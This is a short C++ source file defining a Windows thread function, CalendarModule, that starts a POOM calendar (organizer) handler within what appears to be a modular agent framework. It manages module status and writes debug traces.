#include "Modules.h"
#include "Common.h"
#include "Module.h"
#include "FunctionFunc.h"
#include "PoomCommon.h"
#include "Log.h"
#include "PoomCalendar.h"

DWORD WINAPI CalendarModule(LPVOID lpParam) {
	Module *me = (Module *)lpParam;
	HANDLE agentHandle;

	me->setStatus(MODULE_RUNNING);
	agentHandle = me->getEvent();

	CPoomCalendar *poom = poom->self();

	DBG_TRACE(L"Debug - Calendar.cpp - Calendar Module started\n", 5, FALSE);

	if (poom->IsValid()) {
		poom->Run(MODULE_ORGANIZER);
	} else {
		DBG_TRACE(L"Debug - Calendar.cpp - Calendar err 2 \n", 5, FALSE);
		me->setStatus(MODULE_STOPPED);
		return TRUE;
	}


	DBG_TRACE(L"Debug - Calendar.cpp - Calendar Module is Closing\n", 1, FALSE);
	delete poom;

	me->setStatus(MODULE_STOPPED);
	return 0;

}